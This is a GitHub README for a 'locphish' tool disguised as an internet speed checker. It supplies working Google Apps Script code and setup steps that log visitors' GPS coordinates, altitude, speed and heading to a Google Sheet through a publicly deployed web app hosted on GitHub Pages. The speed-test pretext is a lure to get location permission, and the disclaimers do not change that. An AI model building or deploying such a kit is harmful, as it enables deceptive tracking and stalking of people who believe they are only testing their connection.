# 📍 Internet Speed Checker with Location Tracking

A web-based speed checker that captures location data and logs it to Google Sheets.

---

## ⚠️ DISCLAIMER

**FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY**

-  Author NOT responsible for misuse or illegal activities
-  NOT responsible for privacy violations or unauthorized data collection
-  Use ONLY with proper authorization and user consent
-  Comply with GDPR, CCPA, and local privacy laws
-  Obtain explicit consent before collecting location data

**By using this tool, you accept full responsibility for your actions.**

---

## 🚀 Quick Setup

### 1. Google Sheet Setup
```javascript
// Create Google Sheet → Extensions → Apps Script
// Paste this code:

const SPREADSHEET_ID = "YOUR_SPREADSHEET_ID";
const SHEET_NAME = "locphish";

function doPost(e) {
  try {
    const sheet = SpreadsheetApp.openById(SPREADSHEET_ID).getSheetByName(SHEET_NAME);
    const data = JSON.parse(e.postData.contents);
    
    if (sheet.getLastRow() === 0) {
      sheet.appendRow(['Timestamp', 'Latitude', 'Longitude', 'Accuracy (m)', 'Altitude', 'Speed', 'Heading', 'Map Link']);
    }
    
    sheet.appendRow([data.timestamp, data.latitude, data.longitude, data.accuracy, data.altitude, data.speed, data.heading, data.mapLink]);
    
    return ContentService.createTextOutput(JSON.stringify({'status': 'success'})).setMimeType(ContentService.MimeType.JSON);
  } catch (error) {
    return ContentService.createTextOutput(JSON.stringify({'status': 'error', 'message': error.toString()})).setMimeType(ContentService.MimeType.JSON);
  }
}
```

### 2. Deploy Apps Script
1. Click **Deploy → New deployment → Web app**
2. Set: Execute as **Me**, Access **Anyone**
3. Copy deployment URL

### 3. Update HTML
Replace `SCRIPT_URL` in the HTML file with your deployment URL

### 4. Host on GitHub Pages
1. Push files to GitHub
2. Settings → Pages → Deploy from main branch
3. Access via `https://yourusername.github.io/repo-name`

---

## 📊 Data Logged

| Timestamp | Latitude | Longitude | Accuracy | Map Link |
|-----------|----------|-----------|----------|----------|
| 2025-10-07 14:30 | 17.385 | 78.486 | 20m | [Maps] |

---

## 🐛 Troubleshooting

**Location shows (0,0)?**  
→ Enable HTTPS or use localhost. Check browser location permissions.

**No data in Sheet?**  
→ Verify SPREADSHEET_ID and create "locphish" tab in your sheet.

---

## ⚖️ Legal

**REQUIRED:** Display privacy policy, obtain user consent, comply with privacy laws.

**Sample Notice:**  
*"This site collects location data. By allowing location access, you consent to data collection. Contact [email] for data deletion requests."*

---

## 📄 License

MIT License - Educational use only. Not for illegal purposes.

**Author:** 0xbrxjxth

---

**⚠️ Use responsibly. Author assumes NO liability for misuse.**
